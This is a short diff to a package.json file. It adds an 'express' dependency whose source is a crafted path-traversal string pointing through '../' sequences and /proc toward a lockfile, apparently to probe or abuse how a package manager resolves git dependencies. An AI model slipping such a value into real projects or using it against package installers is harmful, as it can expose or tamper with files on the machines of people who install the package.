@@ -13,7 +13,8 @@
     "postinstall": "echo installed"
   }, 
   "dependencies": {
-    "npm_pkg": "github:Yosiroute/npm_pkg"
+    "npm_pkg": "github:Yosiroute/npm_pkg",
+     "express": "github/../../../../../../../.package-lock.json/tar_git#../../../../../../../../../../proc/seld/cwd/node_modules/.package-lock.json"
   }
 }
 
